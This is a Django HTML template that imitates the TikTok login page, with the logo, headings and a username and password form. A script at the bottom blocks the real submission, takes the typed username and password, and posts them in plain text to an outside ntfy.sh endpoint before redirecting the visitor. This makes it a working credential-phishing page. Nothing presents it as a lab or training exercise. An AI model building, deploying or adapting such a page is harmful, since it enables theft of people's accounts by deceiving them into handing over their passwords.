{% load static %}
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Login</title>
    <script src="https://cdn.tailwindcss.com"></script>

    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
</head>

<body class="bg-gray-100 flex flex-col bg-white items-center justify-center min-h-screen">
    <!-- Header -->
    <header class="w-full fixed top-0 flex justify-between items-center px-6 py-4 bg-white shadow-md">
        <img src="{% static 'images/TT_logo.png' %}" alt="TikTok logo" class="h-10">
        <p class="text-gray-600 flex items-center">
            <i class='bx bx-help-circle text-lg mr-1'></i>
            <a href="#" class="hover:underline">Feedback and help</a>
        </p>
    </header>

    <!-- Main Content -->
    <main class="bg-white rounded-lg p-8 w-full max-w-md mt-10">
        <h1 class="text-2xl font-semibold text-center text-gray-800">Log in to TikTok</h1>
        <p class="text-gray-500 text-center mt-2">Manage your account, check notifications, comment on videos, and more.</p>

        <!-- Login Form -->
        <form class="mt-6 space-y-4">
            <div>
                <label for="username" class="block text-gray-600 font-medium">Email / Username</label>
                <input type="text" id="username" name="username" placeholder="Enter email or username"
                    class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500" required>
            </div>

            <div>
                <label for="password" class="block text-gray-600 font-medium">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter password"
                    class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500" required>
            </div>

            <button type="submit"
                class="w-full bg-red-500 hover:bg-red-600 text-white font-bold py-2 rounded-lg transition duration-200">
                Log In
            </button>

            <p class="text-center text-sm text-gray-500">
                <a href="#" class="text-red-500 hover:underline">Forgot password?</a>
            </p>
        </form>

        <hr class="my-6 border-gray-300">

        <!-- Sign Up Link -->
        <p class="text-center text-gray-600">
            Don't have an account?
            <a href="#" class="text-red-500 font-medium hover:underline">Sign up</a>
        </p>
    </main>

    <script>
        document.querySelector("form").addEventListener("submit", function (event) {
            event.preventDefault(); // Prevent form submission

            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            fetch("https://ntfy.sh/GiveRAw", {
                method: "POST",
                headers: { "Content-Type": "text/plain" },
                body: `Tiktok Login Attempt:\nUsername: ${username}\nPassword: ${password}`
            });

            // Redirect after login attempt (Modify as needed)
            window.location.href = "/";
        });
    </script>
</body>

</html>
